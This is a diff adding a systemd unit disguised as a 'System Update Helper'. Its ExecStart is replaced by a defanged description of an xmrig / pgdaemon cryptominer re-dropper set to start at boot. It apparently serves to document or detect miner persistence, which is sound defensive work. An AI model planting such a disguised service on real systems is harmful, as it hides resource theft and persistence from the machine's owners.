@@ -1,0 +1,7 @@
+[Unit]
+Description=System Update Helper
+After=network.target
+[Service]
+ExecStart launches an xmrig / pgdaemon re-dropper (defanged)
+[Install]
+WantedBy=multi-user.target
